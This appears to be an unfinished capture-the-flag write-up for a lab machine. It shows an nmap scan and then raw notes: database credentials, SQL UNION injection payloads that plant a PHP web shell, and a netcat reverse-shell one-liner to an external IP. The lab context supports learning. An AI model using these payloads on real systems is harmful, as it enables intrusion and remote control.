# #1 Introduction
<img width="689" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/8ab7415c-a4dc-4331-b63a-ca376955779b">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx debug.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- debug.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";


1 UNION SELECT REPLACE(nickname, 'mateor', '<?php echo system($_GET[0]); ?>'), clicks, level FROM players

9999999999999999999 UNION SELECT '<?php phpinfo(); ?>', 2, 3 from players
999999999999999999
extension: php



sub new {
    system("sh script.sh --help");
}


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.186 6667 >/tmp/f
<img width="746" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/605b42fd-af46-492f-a817-365110c0ad75">

